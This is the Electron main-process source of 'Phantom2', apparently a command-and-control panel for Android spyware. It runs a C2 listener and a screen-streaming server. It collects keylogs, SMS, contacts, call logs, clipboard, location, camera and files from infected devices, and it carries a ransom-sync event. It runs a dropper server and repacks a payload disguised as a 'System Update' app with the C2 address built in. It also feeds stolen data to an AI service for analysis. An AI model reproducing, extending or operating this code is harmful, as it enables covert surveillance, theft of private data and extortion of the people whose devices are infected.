const { app, BrowserWindow, ipcMain, dialog, shell } = require('electron');
const path = require('path');
const fs = require('fs');
const os = require('os');
const net = require('net');
const { spawn } = require('child_process');

const phantom = require('./phantom');
const GroqClient = require('./groq');
const AiAnalysis = require('./ai_analysis');
const repack = require('./repack');

const { PhantomServer, DeviceManager, DataStore } = phantom;

let mainWindow = null;
let phantomServer = null;
let deviceManager = null;
let dataStore = null;
let groqClient = null;
let aiAnalysis = null;
let streamServer = null;
let dropperServerProcess = null;
let CONFIG = {};

const streamClients = new Map();

// ============================================================
// CONFIG & FIRST RUN
// ============================================================
function getFirstRunFlagPath() {
    return path.join(app.getPath('userData'), 'phantom2.firstrun');
}

function isFirstRun() {
    try { return !fs.existsSync(getFirstRunFlagPath()); } catch (e) { return true; }
}

function markFirstRunComplete() {
    try { fs.writeFileSync(getFirstRunFlagPath(), String(Date.now()), 'utf8'); } catch (e) { }
}

function loadConfig() {
    const cfgPath = path.join(__dirname, 'config.json');
    const examplePath = path.join(__dirname, 'config.example.json');
    try {
        if (!fs.existsSync(cfgPath) && fs.existsSync(examplePath)) {
            fs.copyFileSync(examplePath, cfgPath);
        }
        const src = fs.existsSync(cfgPath) ? cfgPath : examplePath;
        return JSON.parse(fs.readFileSync(src, 'utf8'));
    } catch (e) { return {}; }
}

function getC2Ip() { return CONFIG.c2Host || '127.0.0.1'; }
function getC2Port() { return CONFIG.c2Port || 8080; }

function readEnvValue(key) {
    try {
        const envPath = path.join(__dirname, '.env');
        if (!fs.existsSync(envPath)) return null;
        for (const line of fs.readFileSync(envPath, 'utf8').split('\n')) {
            const t = line.trim();
            if (t.startsWith(key + '=')) return t.substring(key.length + 1).trim();
        }
        return null;
    } catch (e) { return null; }
}

function writeEnvValue(key, value) {
    try {
        const envPath = path.join(__dirname, '.env');
        let content = fs.existsSync(envPath) ? fs.readFileSync(envPath, 'utf8') : '';
        const re = new RegExp('^' + key + '=.*$', 'm');
        if (re.test(content)) content = content.replace(re, key + '=' + value);
        else { if (!content.endsWith('\n')) content += '\n'; content += key + '=' + value + '\n'; }
        fs.writeFileSync(envPath, content, 'utf8');
        return true;
    } catch (e) { return false; }
}

// ============================================================
// WINDOW & BOOT
// ============================================================
function createWindow() {
    mainWindow = new BrowserWindow({
        width: 1400, height: 900,
        backgroundColor: '#050708',
        title: 'Phantom2',
        frame: false,
        autoHideMenuBar: true,
        webPreferences: {
            preload: path.join(__dirname, 'preload.js'),
            contextIsolation: true, nodeIntegration: false
        }
    });

    if (isFirstRun()) mainWindow.loadFile('welcome.html');
    else mainWindow.loadFile('index.html');

    mainWindow.on('closed', () => { mainWindow = null; });
}

// ============================================================
// STREAM SERVER (for screen frames over TCP)
// ============================================================
function startStreamServer(port) {
    return new Promise((resolve) => {
        if (streamServer) { try { streamServer.close(); } catch (e) { } streamServer = null; }
        streamServer = net.createServer((socket) => {
            let handshake = false, header = '', deviceId = null, w = 0, h = 0;
            let frameBuf = Buffer.alloc(0);
            function handleFrame(dev, buf) {
                frameBuf = Buffer.concat([frameBuf, buf]);
                while (frameBuf.length >= 4) {
                    const len = frameBuf.readUInt32BE(0);
                    if (frameBuf.length < 4 + len) return;
                    const jpeg = frameBuf.slice(4, 4 + len);
                    frameBuf = frameBuf.slice(4 + len);
                    if (mainWindow) mainWindow.webContents.send('stream-frame', dev, jpeg.toString('base64'));
                }
            }
            socket.on('data', (chunk) => {
                if (!handshake) {
                    header += chunk.toString('utf8');
                    const lines = header.split('\n');
                    if (lines.length >= 4) {
                        deviceId = lines[0].trim();
                        w = parseInt(lines[1]); h = parseInt(lines[2]);
                        handshake = true;
                        streamClients.set(deviceId, { socket, width: w, height: h });
                        if (mainWindow) mainWindow.webContents.send('stream-connected', deviceId, w, h);
                        const rest = lines.slice(3).join('\n');
                        if (rest.length > 0) { const rb = Buffer.from(rest, 'utf8'); if (rb.length >= 4) handleFrame(deviceId, rb); }
                    }
                    return;
                }
                handleFrame(deviceId, chunk);
            });
            socket.on('close', () => { if (deviceId) { streamClients.delete(deviceId); if (mainWindow) mainWindow.webContents.send('stream-disconnected', deviceId); } });
        });
        streamServer.on('error', (err) => { if (err.code === 'EADDRINUSE') startStreamServer(port + 1).then(resolve); else resolve(false); });
        streamServer.listen(port, '0.0.0.0', () => resolve(true));
    });
}

// ============================================================
// BACKEND INIT
// ============================================================
function initializeBackend() {
    try { dataStore = new DataStore(); } catch (err) { console.error(err.message); }
    try {
        phantomServer = new PhantomServer({});
        if (dataStore) phantomServer.setDataStore(dataStore);
    } catch (err) { console.error(err.message); }
    try { deviceManager = new DeviceManager(phantomServer); } catch (err) { console.error(err.message); }
    try {
        groqClient = new GroqClient();
        phantomServer.setGroq(groqClient);
    } catch (err) { console.error('AI: ' + err.message); }
    try { aiAnalysis = new AiAnalysis(groqClient, dataStore, phantomServer); }
    catch (err) { console.error('AiAnalysis: ' + err.message); }

    setupEventHandlers();
}

function setupEventHandlers() {
    const simple = ['commandResult', 'keylog', 'clipboard', 'sms', 'contacts', 'calls', 'apps', 'deviceLog', 'uiTree', 'foreground', 'location', 'camera', 'files'];
    simple.forEach(ev => phantomServer.on(ev, (...args) => {
        if (mainWindow) mainWindow.webContents.send(ev.replace(/([A-Z])/g, '-$1').toLowerCase(), ...args);
    }));

    phantomServer.on('deviceConnected', (d) => {
        try { if (dataStore) dataStore.saveDevice(d); } catch (e) { }
        if (mainWindow) mainWindow.webContents.send('device-connected', d);
    });
    phantomServer.on('deviceDisconnected', (d) => { if (mainWindow) mainWindow.webContents.send('device-disconnected', d); });
    phantomServer.on('fileData', (id, name, b64) => {
        if (mainWindow) mainWindow.webContents.send('file-data', id, name, b64);
    });
    phantomServer.on('screenFrame', (id, b64) => { if (mainWindow) mainWindow.webContents.send('screen-frame', id, b64); });
    phantomServer.on('ransomSync', (id, msg) => { if (mainWindow) mainWindow.webContents.send('ransom-sync', id, msg); });
    phantomServer.on('userData', (id, d) => { if (mainWindow) mainWindow.webContents.send('user-data', id, d); });
}

// ============================================================
// IPC: WELCOME
// ============================================================
ipcMain.handle('welcome-start', async () => {
    markFirstRunComplete();
    if (mainWindow) mainWindow.loadFile('index.html');
    return { ok: true };
});
ipcMain.handle('welcome-learn', async () => {
    try { await shell.openExternal('https://github.com/NBMDEV/phantom2#quick-start'); } catch (e) { }
    return { ok: true };
});
ipcMain.handle('welcome-reset', async () => {
    try { if (fs.existsSync(getFirstRunFlagPath())) fs.unlinkSync(getFirstRunFlagPath()); } catch (e) { }
    if (mainWindow) mainWindow.loadFile('welcome.html');
    return { ok: true };
});
ipcMain.handle('app-quit', async () => { app.quit(); return { ok: true }; });

// ============================================================
// IPC: CONFIG
// ============================================================
ipcMain.handle('config-get', async () => {
    CONFIG = loadConfig();
    return { ok: true, config: CONFIG };
});
ipcMain.handle('config-save', async (e, newConfig) => {
    try {
        const cfgPath = path.join(__dirname, 'config.json');
        fs.writeFileSync(cfgPath, JSON.stringify(newConfig, null, 2), 'utf8');
        CONFIG = newConfig;
        return { ok: true };
    } catch (err) { return { ok: false, error: err.message }; }
});

// ============================================================
// IPC: LISTENER
// ============================================================
ipcMain.handle('start-listener', async (e, port) => {
    try {
        await phantomServer.start(port);
        await startStreamServer(port + 1);
        return { success: true, port };
    } catch (err) { return { success: false, error: err.message }; }
});
ipcMain.handle('stop-listener', async () => {
    try {
        phantomServer.stop();
        if (streamServer) { try { streamServer.close(); } catch (e) { } streamServer = null; }
        return { success: true };
    } catch (err) { return { success: false, error: err.message }; }
});
ipcMain.handle('get-pc-ip', async () => {
    try {
        const ifaces = os.networkInterfaces();
        const addresses = [];
        for (const name of Object.keys(ifaces)) {
            for (const iface of ifaces[name]) {
                if (iface.family === 'IPv4' && !iface.internal) addresses.push({ interface: name, address: iface.address });
            }
        }
        const pref = addresses.find(a => a.address.startsWith('192.168.') || a.address.startsWith('10.') || a.address.startsWith('172.'));
        const primary = pref ? pref.address : (addresses[0] ? addresses[0].address : '127.0.0.1');
        return { success: true, primary: getC2Ip(), local: primary, addresses };
    } catch (err) { return { success: false, primary: getC2Ip(), local: '127.0.0.1', addresses: [] }; }
});

// ============================================================
// IPC: AI ANALYSIS
// ============================================================
ipcMain.handle('ai-analyze', async (e, deviceId, scope) => {
    try {
        if (!aiAnalysis) return { ok: false, error: 'Analyzer not initialized' };
        // Forward streaming events to renderer
        aiAnalysis.removeAllListeners('chunk');
        aiAnalysis.removeAllListeners('done');
        aiAnalysis.removeAllListeners('error');

        aiAnalysis.on('chunk', (d) => { if (mainWindow) mainWindow.webContents.send('ai-analysis-chunk', d); });
        aiAnalysis.on('done', (d) => { if (mainWindow) mainWindow.webContents.send('ai-analysis-done', d); });
        aiAnalysis.on('error', (d) => { if (mainWindow) mainWindow.webContents.send('ai-analysis-error', d); });

        return await aiAnalysis.run(deviceId, scope);
    } catch (err) { return { ok: false, error: err.message }; }
});
ipcMain.handle('ai-analyze-cancel', async () => {
    try { if (aiAnalysis) aiAnalysis.cancel(); return { ok: true }; }
    catch (err) { return { ok: false, error: err.message }; }
});
ipcMain.handle('ai-analyze-save', async (e, filename, content) => {
    try {
        const dir = path.join(__dirname, 'exports', 'analysis');
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        const safe = (filename || ('report_' + Date.now() + '.md')).replace(/[^A-Za-z0-9._-]/g, '_');
        const full = path.join(dir, safe);
        fs.writeFileSync(full, content || '', 'utf8');
        return { ok: true, path: full };
    } catch (err) { return { ok: false, error: err.message }; }
});

// ============================================================
// IPC: DROPPER
// ============================================================
ipcMain.handle('dropper-server-start', async () => {
    if (dropperServerProcess) return { ok: true, already: true };
    try {
        const script = path.join(__dirname, 'dropper_server.js');
        if (!fs.existsSync(script)) return { ok: false, error: 'dropper_server.js missing' };
        dropperServerProcess = spawn('node', ['dropper_server.js'], { cwd: __dirname, windowsHide: true });
        dropperServerProcess.stdout.on('data', (d) => {
            const l = d.toString().trim();
            if (mainWindow && l) mainWindow.webContents.send('dropper-log', l);
        });
        dropperServerProcess.stderr.on('data', (d) => {
            const l = d.toString().trim();
            if (mainWindow && l) mainWindow.webContents.send('dropper-log', '[ERR] ' + l);
        });
        dropperServerProcess.on('close', () => {
            if (mainWindow) mainWindow.webContents.send('dropper-status', false);
            dropperServerProcess = null;
        });
        await new Promise(r => setTimeout(r, 1200));
        if (mainWindow) mainWindow.webContents.send('dropper-status', true);
        return { ok: true };
    } catch (err) { return { ok: false, error: err.message }; }
});
ipcMain.handle('dropper-server-stop', async () => {
    if (!dropperServerProcess) return { ok: true };
    dropperServerProcess.kill();
    dropperServerProcess = null;
    if (mainWindow) mainWindow.webContents.send('dropper-status', false);
    return { ok: true };
});
ipcMain.handle('dropper-server-status', async () => ({ running: dropperServerProcess !== null }));
ipcMain.handle('dropper-get-token', async () => ({ ok: true, token: readEnvValue('DROPPER_TOKEN') || '' }));
ipcMain.handle('dropper-regenerate-token', async () => {
    const t = require('crypto').randomBytes(8).toString('hex');
    if (!writeEnvValue('DROPPER_TOKEN', t)) return { ok: false, error: '.env write failed' };
    return { ok: true, token: t };
});
ipcMain.handle('dropper-set-token', async (e, t) => {
    if (!writeEnvValue('DROPPER_TOKEN', t)) return { ok: false, error: '.env write failed' };
    return { ok: true, token: t };
});

// ============================================================
// IPC: REPACK / BUILD
// ============================================================
ipcMain.handle('repack-build', async (e, options) => {
    const opts = options || {};
    const c2Ip = opts.c2Ip || getC2Ip();
    const c2Port = opts.c2Port || getC2Port();
    const dropperToken = readEnvValue('DROPPER_TOKEN') || '';
    const keepBuild = !!opts.keepBuild;
    const buildDropper = opts.buildDropper !== false;

    function onLog(type, msg) {
        if (mainWindow) mainWindow.webContents.send('build-log', { type, message: msg });
    }

    try {
        const spec = {
            appName: 'System Update',
            packageSuffix: 'systemupdate',
            theme: {},
            files: {}
        };

        const r = await repack.repack(spec, {
            c2Ip, c2Port, dropperToken,
            outputName: 'SystemUpdate',
            keepBuild, buildDropper
        }, onLog);

        return r;
    } catch (err) {
        onLog('error', 'Repack exception: ' + err.message);
        return { ok: false, error: err.message };
    }
});

// ============================================================
// IPC: DEVICES & DATA
// ============================================================
ipcMain.handle('get-devices', async () => deviceManager.getAllDevices());
ipcMain.handle('send-command', async (e, id, cmd, params) => deviceManager.sendCommand(id, cmd, params));
ipcMain.handle('get-data', async (e, cat, id) => {
    try {
        if (cat === 'sms') return dataStore.getSMS(id);
        if (cat === 'contacts') return dataStore.getContacts(id);
        if (cat === 'keylogs') return dataStore.getKeylogs(id);
        if (cat === 'clipboard') return dataStore.getClipboard(id);
        if (cat === 'calls') return dataStore.getCalls(id);
        return [];
    } catch (err) { return []; }
});
ipcMain.handle('get-user-data', async () => { try { return dataStore.getUserData(); } catch (err) { return []; } });
ipcMain.handle('export-data', async () => {
    try {
        const d = dataStore.exportData();
        const r = await dialog.showSaveDialog({ title: 'Export', defaultPath: 'phantom2_export.json', filters: [{ name: 'JSON', extensions: ['json'] }] });
        if (!r.canceled) { fs.writeFileSync(r.filePath, JSON.stringify(d, null, 2)); return { success: true, path: r.filePath }; }
        return { success: false };
    } catch (err) { return { success: false, error: err.message }; }
});
ipcMain.handle('clear-data', async () => { try { dataStore.clearAllData(); return { success: true }; } catch (err) { return { success: false, error: err.message }; } });

// ============================================================
// IPC: SYSTEM / EXTERNAL
// ============================================================
ipcMain.handle('system-info', async () => ({
    ok: true, platform: process.platform, arch: process.arch,
    nodeVersion: process.versions.node, electronVersion: process.versions.electron,
    appVersion: app.getVersion(), home: os.homedir(), cwd: __dirname
}));
ipcMain.handle('open-external', async (e, url) => {
    try {
        if (typeof url !== 'string' || !/^https?:\/\//i.test(url)) return { ok: false };
        await shell.openExternal(url);
        return { ok: true };
    } catch (err) { return { ok: false, error: err.message }; }
});

// ============================================================
// BOOT
// ============================================================
app.whenReady().then(() => {
    CONFIG = loadConfig();
    initializeBackend();
    createWindow();
});

app.on('window-all-closed', () => {
    if (dropperServerProcess) { try { dropperServerProcess.kill(); } catch (e) { } }
    if (process.platform !== 'darwin') app.quit();
});

app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow();
});